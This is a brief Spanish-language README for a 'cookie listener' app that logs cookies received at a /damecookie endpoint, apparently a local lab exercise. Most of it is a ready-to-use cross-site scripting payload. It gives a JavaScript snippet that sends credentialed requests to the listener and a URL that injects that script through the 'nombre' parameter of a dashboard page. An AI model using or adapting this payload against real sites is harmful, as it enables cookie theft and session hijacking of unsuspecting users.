# Cookie listener
Esta app loguea lasn cookies de los requests que recibe en `/damecookie`

## Correr app
`npm start`

## Inyectar script
`var xhr = new XMLHttpRequest();xhr.open("POST",'http://localhost:4000/damecookie');xhr.withCredentials = true;xhr.send()`

http://localhost:3000/html/home/user/dashboard/index.html?nombre=admin%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%22POST%22,%27http://localhost:4000/damecookie%27);xhr.withCredentials%20=%20true;xhr.send()%3C/script%3E
